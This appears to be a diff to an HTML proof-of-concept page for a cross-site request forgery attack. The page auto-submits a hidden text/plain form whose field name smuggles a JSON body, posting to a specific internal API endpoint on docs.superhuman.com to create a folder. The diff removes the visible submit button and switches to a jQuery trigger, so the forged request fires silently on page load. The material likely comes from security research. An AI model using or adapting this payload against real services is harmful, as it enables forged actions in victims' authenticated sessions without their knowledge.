@@ -6,14 +6,13 @@
       $(document).ready(
         function() {
           $("#z").attr("name",'{"name":"test-csrf","icon":null,"iconColor":null,"description":"csrf-attack","fakeparam":"');
-          $("#f").submit();
+          $('#f').trigger('submit');
       });
     </script>
   </head>
 <body>
   <form id="f" ENCTYPE="text/plain" action="https://docs.superhuman.com/internalAppApi/workspaces/ws-96RE0OTDqM/folders" method="post">
-    <input id="z" type="hidden" name='test' value='test"}'> 
-    <input type="submit" value="send">
+    <input id="z" type="hidden" name='test' value='test"}'>
   </form>
 </body>
 </html>
